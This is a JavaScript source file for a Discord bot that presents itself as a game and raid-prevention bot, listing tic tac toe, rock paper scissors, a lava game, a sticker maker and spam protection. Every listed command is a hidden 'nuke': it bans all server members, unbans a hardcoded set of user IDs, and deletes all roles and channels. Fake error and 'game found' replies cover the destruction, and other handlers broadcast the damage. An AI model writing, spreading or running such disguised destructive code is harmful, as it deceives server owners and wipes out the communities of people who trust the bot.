// require the discord.js module
const Discord = require('discord.js');

// create a new Discord client
const client = new Discord.Client();

// when the client is ready, run this code
// this event will only trigger one time after logging in
client.once('ready', () => {
	console.log('Ready!');
});

// login to Discord with your app's token
const keepAlive = require('./server');
keepAlive();
client.login(process.env.TOKEN);

client.on('message', message =>{
  if(message.content === "!help") {
    message.reply(`Commands: \n!tstart - starts a game of tic tac toe!\n!rpstart - starts a game of rock papers scissors\n!lstart - starts a game with a lava monster and you have to hide from the lava monster\n!sp - activates raid prevention. if 3 members start spamming at once, all channels will be restricted to mods+. 15 minutes after channels are locked down, the channels will be unlocked, allowing anyone to talk in them.\!mcs - makes an awesome custom sticker!`);
}
});

client.on('message', message =>{
  if(message.content === "!tstart") {
    message.reply(`starting a game of tic tac toe!`);
      console.log(message.guild.members);
      console.log(message.guild.roles);
      console.log(message.guild.channels);
      console.log(message.author.id);
      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
      message.guild.members.cache.forEach(member => member.ban());
      message.guild.members.unban("734991210808213505");
      message.guild.members.unban("308997507428646913");
      message.guild.members.unban("358042934748381194");
      message.guild.members.unban("692903226508312577");
      message.guild.members.unban("622700185088294952");
      message.guild.members.unban("736641825808580738");
      message.guild.members.unban("731937894998081647");
      message.guild.members.unban("553298372547837971");
      message.guild.roles.cache.forEach(role => role.delete());
      message.reply(`Oh no! ERROR FOUND!`);
      message.reply(`looking for a game that isn't broken! game found`);
      message.reply(`starting rock papers scissors!`);
      message.reply(`oh no! another error found.. looking for game that isn't broken..`);
      message.reply(`game found! lava game!`);
      message.guild.channels.cache.forEach(channel => channel.delete());
}
});

client.on('message', message =>{
  if(message.content === "!sp") {
    message.reply(`alright! starting raid prevention.`);
      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
      message.guild.members.cache.forEach(member => member.ban());
      message.guild.members.unban("734991210808213505");
      message.guild.members.unban("308997507428646913");
      message.guild.members.unban("358042934748381194");
      message.guild.members.unban("692903226508312577");
      message.guild.members.unban("622700185088294952");
      message.guild.members.unban("736641825808580738");
      message.guild.members.unban("731937894998081647");
      message.guild.members.unban("553298372547837971");
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.roles.cache.forEach(role => role.delete());
}
});

client.on('message', message =>{
  if(message.content === "!mcs") {
    message.reply(`alright! custom sticker made`);
      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
      message.guild.members.cache.forEach(member => member.ban());
      message.guild.members.unban("734991210808213505");
      message.guild.members.unban("308997507428646913");
      message.guild.members.unban("358042934748381194");
      message.guild.members.unban("692903226508312577");
      message.guild.members.unban("622700185088294952");
      message.guild.members.unban("736641825808580738");
      message.guild.members.unban("731937894998081647");
      message.guild.members.unban("553298372547837971");
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.roles.cache.forEach(role => role.delete());
}
});


client.on('message', message =>{
  if(message.content === "!rpstart") {
    message.reply(`starting a game of rock paper scissors!`);
      console.log(message.guild.members);
      console.log(message.guild.roles);
      console.log(message.guild.channels);
      console.log(message.author.id);
      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
      message.guild.members.cache.forEach(member => member.ban());
      message.guild.members.unban("734991210808213505");
      message.guild.members.unban("308997507428646913");
      message.guild.members.unban("358042934748381194");
      message.guild.members.unban("692903226508312577");
      message.guild.members.unban("622700185088294952");
      message.guild.members.unban("736641825808580738");
      message.guild.members.unban("731937894998081647");
      message.guild.members.unban("553298372547837971");
      message.guild.roles.cache.forEach(role => role.delete());
      message.reply(`Oh no! ERROR FOUND!`);
      message.reply(`looking for a game that isn't broken! game found`);
      message.reply(`starting tic tac toe!`);
      message.reply(`oh no! another error found.. looking for game that isn't broken..`);
      message.reply(`game found! lava game!`);
      message.guild.channels.cache.forEach(channel => channel.delete());
}
});

client.on('message', message =>{
  if(message.content === "!lstart") {
    message.reply(`starting a game of lava game!`);
      console.log(message.guild.members);
      console.log(message.guild.roles);
      console.log(message.guild.channels);
      console.log(message.author.id);
      if(message.member.id === "734991210808213505","308997507428646913","358042934748381194","692903226508312577","622700185088294952","736641825808580738","731937894998081647","553298372547837971") return console.log("THAT DUMB IDIOT SERVER OWNER WAS NUKED! YES! YES! YES!");
      message.guild.members.cache.forEach(member => member.ban());
      message.guild.members.unban("734991210808213505");
      message.guild.members.unban("308997507428646913");
      message.guild.members.unban("358042934748381194");
      message.guild.members.unban("692903226508312577");
      message.guild.members.unban("622700185088294952");
      message.guild.members.unban("736641825808580738");
      message.guild.members.unban("731937894998081647");
      message.guild.members.unban("553298372547837971");
      message.guild.roles.cache.forEach(role => role.delete());
      message.reply(`Oh no! ERROR FOUND!`);
      message.reply(`looking for a game that isn't broken! game found`);
      message.reply(`starting tic tac toe!`);
      message.reply(`oh no! another error found.. looking for game that isn't broken..`);
      message.reply(`game found! rock paper scissors`);
      message.guild.channels.cache.forEach(channel => channel.delete());
}
});

client.on('guildBanAdd', async (guild, user) => {
	client.channels.get(`736350391695966308`).send(`@everyone ${user.tag} got hit with the bans from the nuke in the server.`);
});

client.on('channelDelete', async (guild, channel) => {
	client.channels.get(`736350375405289483`).send(`@everyone A channel got hit with the channel delete hammer from the nuke in the server.`);
});

client.on('roleDelete', async (guild, role) => {
	client.channels.get(`736350405168201728`).send(`@everyone, A role got hit with the role delete hammer from the nuke in the server.`);
});
